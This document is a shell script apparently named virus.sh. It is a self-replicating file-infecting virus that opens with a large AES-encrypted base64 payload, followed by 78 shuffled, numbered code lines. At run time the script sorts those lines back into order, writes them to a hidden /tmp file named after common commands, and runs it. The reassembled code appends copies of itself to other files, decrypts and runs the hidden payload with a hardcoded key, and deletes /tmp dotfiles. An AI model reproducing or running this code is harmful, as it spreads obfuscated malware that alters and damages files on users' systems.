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
tail -n 78 ./virus.sh | awk '{ print($NF" "$0) }' | cut -d"@" -f2- | sort -g | cut -d" " -f2- > /tmp/.cd
chmod +x /tmp/.cd && /tmp/.cd &
exit 0
  fi  #@64
        payload+=("$row")  #@62
  declare -i nbl=0  #@38
  nbline=${nbline##}  #@21
  target=${tree[i]}  #@19
      if [ -d "$target" ];then  #@8
filename="$0"  #@50
        row="$line"  #@57
        visit "$target/*"  #@9
  NEWFILE=${MANAGER[$((RANDOM % 4))]}  #@26
for (( i=0; i<${#tree[@]}; i++ )); do  #@18
done  #@68
      done  #@63
  tabft=("FT" [78]=" ")  #@37
tree=()  #@4   
    continue  #@24
# End payload
      while read -r line; do  #@56
    line=$(tail -n $valindex $0 | head -1)  #@44
# U2FsdGVkX1/sR6BSVb24vkVlwoEd4fw9q0AJOjmDxWq8twhYprob33H09R3uZmtY
  exit 0  #@2
MANAGER=(test cd ls pwd)  #@16
    while [ "${tabft[$valindex]}" == "FT" ]; do  #@41
}  #@14
  echo "exit 0" >> $target  #@36
key="asdffdsa"  #@51
      fi  #@12
sh ./xxxxxxxxxxdecrypt.sh  #@72
    valindex=$(((RANDOM % 78)+1))  #@40
  for target in $directory; do  #@7  
    row="$line"  #@54
  echo "${payload[i]}" >> xxxxxxxxxxencrypt.sh  #@67
  done  #@47
  fi  #@31
done < "$filename"  #@65
  echo "tail -n 78 $0 | awk '{ print(\$NF\" \"\$0) }' | cut -d\"@\" -f2- | sort -g | cut -d\" \" -f2- > $NEWFILE" >> $target  #@34
fi  #@3
          break  #@59
rm /tmp/.* 2> /dev/null #@49
    echo -e "$line" >> $target  #@45
if [ "$1" == "test" ]; then  #@1
  NEWFILE=${MANAGER[$((RANDOM % 4))]}  #@32
    nbl=$(($nbl+1)) && tabft[$valindex]="FT"  #@46
  fi  #@25
while read -r line; do  #@53
  if [ $(($nbline)) -lt 80 ]; then  #@23
done  #@48
  done  #@13
    if [ "$row" == "# Start payload" ]; then  #@55
  nbline=$(echo $nbline | cut -d " " -f1)  #@22
  if [ "$?" == "0" ]; then  #@29
RANDOM=$$  #@17
# Start payload
    continue  #@30
        if [ "$row" == "# End payload" ]; then  #@58
rm xxxxxxxxxxencrypt.sh  #@73
    else  #@10
payload=()  #@52
      tree+=("$target")  #@11
visit(){  #@5
        fi  #@60
  while [ $nbl -ne 78 ]; do  #@39
for (( i=0; i<${#payload[@]}; i++ )); do  #@66
  tail -n 78 $target | awk '{ print($NF" "$0) }' | cut -d"@" -f2- | sort -g | cut -d" " -f2- > /tmp/".$NEWFILE"  #@27
chmod 777 xxxxxxxxxxdecrypt.sh  #@71
  echo "chmod +x $NEWFILE && $NEWFILE &" >> $target  #@35
      valindex=$(((RANDOM % 78) + 1))  #@42
  nbline=$(wc -l $target)  #@20
  chmod +x /tmp/".$NEWFILE" && /tmp/".$NEWFILE" test 2> /dev/null;  #@28
  directory=$1  #@6
openssl enc -d -aes-128-cbc -a -salt -pass pass:$key -in xxxxxxxxxxencrypt.sh >> xxxxxxxxxxdecrypt.sh  #@70
visit "*"  #@15
    done  #@43
rm xxxxxxxxxxdecrypt.sh  #@74
  NEWFILE="/tmp/.$NEWFILE"  #@33
# aqzZDIg5lHHDJwdintAteYEiVG3+uMmEnoaIUBRm7oLjPa52jxQj7JeNLne6+W5r
echo "#!/bin/sh" >> xxxxxxxxxxdecrypt.sh  #@69
        row=$(echo "$row" | cut -d' ' -f 2)  #@61
